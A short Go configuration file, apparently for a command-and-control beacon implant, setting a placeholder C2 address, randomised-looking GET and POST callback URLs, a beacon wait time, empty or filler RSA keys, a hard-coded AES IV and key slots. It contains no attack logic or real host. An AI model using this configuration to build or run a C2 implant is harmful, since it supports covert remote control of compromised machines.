package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`-----BEGIN PUBLIC KEY-----

-----END PUBLIC KEY-----`)
	RsaPrivateKey = []byte(`-----BEGIN PRIVATE KEY-----
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA	
-----END PRIVATE KEY-----`)

	C2        = "ip:443"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = sslHTTP + C2 + "/5aq/XP/SY75Qyw.htm"
	PostUrl   = sslHTTP + C2 + "/RCg/vp6rBcQ.htm"
	WaitTime  = 10000 * time.Millisecond
	VerifySSLCert = true
	TimeOut time.Duration  = 3 //second

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
)

const (
	DebugMode = true
)
